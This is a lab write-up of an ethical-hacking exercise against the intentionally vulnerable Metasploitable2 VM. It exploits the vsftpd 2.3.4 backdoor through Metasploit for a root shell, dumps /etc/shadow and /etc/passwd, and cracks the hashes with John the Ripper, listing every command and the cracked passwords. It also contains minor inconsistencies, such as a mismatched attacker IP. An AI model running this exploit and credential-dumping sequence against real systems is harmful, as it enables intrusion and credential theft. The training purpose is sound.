> **Note:** This lab is Part 1 of a 3-part series following the same target and session across the ethical hacking lifecycle. The session established here continues in:
> - Phase 4 – [`system-hacking-maintaining-access.md`](../MaintainingAccess/system-hacking-maintaining-access.md)
> - Phase 5 – [`system-hacking-clearing-tracks.md`](../CoveringTracks/system-hacking-clearing-tracks.md)

---

# System Hacking: Gaining Access

## Objective
To exploit a known backdoor vulnerability in the vsftpd 2.3.4 FTP service on Metasploitable2, obtain an unauthenticated root shell, and extract system credentials through password hash dumping and offline cracking — demonstrating the complete Gaining Access phase of the ethical hacking lifecycle.

---

## Tools Used

| Tool | Version | Purpose |
|------|---------|---------|
| Nmap | 7.95 | Service version enumeration |
| Metasploit Framework (msfconsole) | msf6 | Exploit delivery and shell management |
| John the Ripper | - | Offline password hash cracking |
| unshadow | - | Combining passwd and shadow files for John |

---

## Lab Environment

| Role | Machine | IP Address |
|------|---------|-----------|
| Attacker | Kali Linux | 192.168.23.129 |
| Target | Metasploitable2 | 192.168.23.131 |

Both machines were isolated on the same internal network with no internet routing. No third-party systems were involved at any point during this lab.

---

## Background

vsftpd 2.3.4, shipped with Metasploitable2, contains a deliberately introduced backdoor. When a username ending in the smiley face sequence `:)` is supplied during FTP authentication, the service opens a root bind shell on TCP port 6200 without requiring any authentication. This backdoor was introduced into the vsftpd source code in June 2011 and was discovered within days. Metasploit includes a reliable exploit module for this vulnerability (`exploit/unix/ftp/vsftpd_234_backdoor`, ranked Excellent).

This lab demonstrates how a single unpatched service version running as root can result in full system compromise within minutes.

---

## Steps Performed

### Step 1 — Identify Kali Attacker IP

The attacker machine network configuration was verified using `ip a` before beginning the engagement.

```bash
ip a
```

<img width="827" height="462" alt="image" src="https://github.com/user-attachments/assets/8f0692d9-56c0-40c8-bef9-575ffe30ad3f" />

**Result:** Kali Linux attacker IP confirmed as `192.168.23.130` on interface `eth3`.

---

### Step 2 — Identify Target IP

The Metasploitable2 target network configuration was verified from the target console.

```bash
ip a
```

<img width="722" height="220" alt="image" src="https://github.com/user-attachments/assets/fb0301a1-0b8c-4220-a497-76c6d4288830" />

**Result:** Target IP confirmed as `192.168.23.131` on interface `eth0`.

---

### Step 3 — Confirm Target Reachability

ICMP ping was used to verify layer 3 connectivity between attacker and target before launching any tools.

```bash
ping -c 3 192.168.23.131
```

<img width="541" height="171" alt="image" src="https://github.com/user-attachments/assets/16926f32-e7d9-466b-8a5f-71956b5f73b1" />

**Result:** 3 packets transmitted, 3 received, 0% packet loss. Average round-trip time approximately 0.499 ms. Target is alive and reachable.

---

### Step 4 — Service Version Enumeration

Nmap was run against the target to identify open ports and exact service versions on the attack surface. Specific ports targeted were those most commonly vulnerable on Metasploitable2.

```bash
nmap -sV -p 21,22,23,80,445,3632 192.168.23.131
```

<img width="764" height="301" alt="image" src="https://github.com/user-attachments/assets/75e4aa52-0781-4022-b8ba-34f2c8c229c0" />

**Result:**

| Port | State | Service | Version |
|------|-------|---------|---------|
| 21/tcp | open | ftp | vsftpd 2.3.4 |
| 22/tcp | open | ssh | OpenSSH 4.7p1 Debian 8ubuntu1 |
| 23/tcp | open | telnet | Linux telnetd |
| 80/tcp | open | http | Apache httpd 2.2.8 |
| 445/tcp | open | netbios-ssn | Samba smbd 3.x-4.x |
| 3632/tcp | open | distccd | distccd v1 GNU 4.2.4 |

vsftpd 2.3.4 on port 21 was confirmed — the target for exploitation.

---

### Step 5 — Load and Configure Metasploit Exploit

Metasploit was launched and the vsftpd 2.3.4 backdoor exploit module was searched, loaded, and configured with the target IP.

```bash
msfconsole -q
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOSTS 192.168.23.131
run
```

<img width="973" height="895" alt="image" src="https://github.com/user-attachments/assets/c7db8d0c-c24e-4a1b-a4fa-06135847656b" />

**Result:** Module loaded with rank `excellent`. RHOSTS set to `192.168.23.131`. Module defaulted to `cmd/unix/interact` payload. Exploit executed and the backdoor service spawned successfully.

---

### Step 6 — Exploit Execution and Root Shell Obtained

The exploit triggered the vsftpd backdoor and a command shell session was opened. Initial post-exploitation commands were run to confirm identity, hostname, and OS.

```bash
whoami
hostname
uname -a
```

<img width="950" height="266" alt="image" src="https://github.com/user-attachments/assets/87380208-e8ff-4a02-b894-442b6248e33c" />

**Result:**
- Shell session 1 opened: `192.168.23.130:34025 -> 192.168.23.131:6200`
- `whoami` returned: `root`
- `hostname` returned: `metasploitable`
- `uname -a` returned: `Linux metasploitable 2.6.24-16-server #1 SMP i686 GNU/Linux`

Full root shell obtained without supplying any credentials.

---

### Step 7 — Password Hash Extraction from /etc/shadow

With root access, the shadow password file was read directly to extract password hashes for all system accounts.

```bash
cat /etc/shadow
```

<img width="828" height="594" alt="image" src="https://github.com/user-attachments/assets/3a1fa425-48c2-4560-a127-bc5d404e6c9e" />

**Result:** Full contents of `/etc/shadow` retrieved. Hash format identified as `$1$` (md5crypt). Accounts with hashes (not locked with `*` or `!`) include: `root`, `sys`, `klog`, `msfadmin`, `postgres`, `user`, `service`.

---

### Step 8 — User Account Enumeration from /etc/passwd

The passwd file was retrieved to map usernames to UIDs, GIDs, home directories, and shells.

```bash
cat /etc/passwd
```

<img width="976" height="596" alt="image" src="https://github.com/user-attachments/assets/e59baeda-930e-48d7-a182-d221c32546db" />

**Result:** Full `/etc/passwd` retrieved. Notable accounts: `msfadmin` (UID 1000), `user` (UID 1001), `service` (UID 1002). Both files were copied to the attacker machine for offline cracking.

---

### Step 9 — Offline Password Cracking with John the Ripper

The shadow and passwd files were saved locally on Kali, combined using `unshadow`, and passed to John the Ripper with the rockyou wordlist.

```bash
# Files saved manually to Kali:
# /tmp/shadow.txt — contents of /etc/shadow
# /tmp/passwd.txt — contents of /etc/passwd

unshadow /tmp/passwd.txt /tmp/shadow.txt > /tmp/combined.txt
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/combined.txt
john --show /tmp/combined.txt
```

<img width="838" height="401" alt="image" src="https://github.com/user-attachments/assets/0b8f972d-0f8b-445d-8cf3-c73a65137271" />

**Result:** John detected md5crypt hash format. 7 hashes loaded. 3 passwords cracked in 6 minutes 26 seconds:

| Username | Cracked Password |
|----------|-----------------|
| klog | 123456789 |
| sys | batman |
| service | service |

Session completed successfully.

---

## Commands Used

```bash
# Network identification
ip a
ping -c 3 192.168.23.131

# Service enumeration
nmap -sV -p 21,22,23,80,445,3632 192.168.23.131

# Exploitation
msfconsole -q
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOSTS 192.168.23.131
run

# Post-exploitation identity checks
whoami
hostname
uname -a

# Credential extraction
cat /etc/shadow
cat /etc/passwd

# Offline hash cracking (on Kali)
unshadow /tmp/passwd.txt /tmp/shadow.txt > /tmp/combined.txt
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/combined.txt
john --show /tmp/combined.txt
```

---

## Observations

- The vsftpd 2.3.4 backdoor required zero authentication and delivered a root shell within seconds of execution.
- The Metasploit module was ranked `excellent`, meaning it is reliable and leaves the target stable after exploitation.
- Nmap version detection (`-sV`) was sufficient to identify the exact vulnerable service version without any intrusive scanning.
- The shadow file was world-readable only because the attacker had root access — on a hardened system this file is readable only by root, making hash extraction dependent on privilege escalation first.
- John the Ripper cracked 3 of 7 hashes in approximately 6 minutes using only the rockyou wordlist, demonstrating how weak passwords remain a significant risk even when hashes are not directly exposed.
- The cracked passwords (`123456789`, `batman`, `service`) are all present in the top 100,000 entries of rockyou.txt, confirming that default and trivially guessable passwords fall to dictionary attacks almost immediately.

---

## Security Relevance

| Risk | Detail |
|------|--------|
| Unpatched service versions | vsftpd 2.3.4 is trivially exploitable and has been public knowledge since 2011 |
| Services running as root | FTP running as UID 0 means any exploit delivers immediate root access |
| Weak password policy | Three accounts cracked in under 7 minutes with a standard wordlist |
| No network segmentation | Attacker reached FTP port directly with no firewall controls in path |
| Shadow file access via root shell | Once root is obtained, all credentials are recoverable regardless of file permissions |

Defenders should enforce automated patch management, run services under unprivileged dedicated accounts, implement host-based firewall rules to restrict FTP exposure, enforce strong password policies with minimum complexity requirements, and monitor for repeated FTP authentication failures or connections to port 6200.

---

## Disclaimer

This lab was performed exclusively on Metasploitable2, an intentionally vulnerable virtual machine designed for security training. Both attacker and target machines were isolated on a host-only internal network with no internet routing. No unauthorized systems were targeted at any point. All techniques demonstrated are for educational purposes only and ethical hacking portfolio development. Performing these techniques against systems without explicit written authorization is illegal under the Computer Fraud and Abuse Act (CFAA) and equivalent legislation in other jurisdictions.
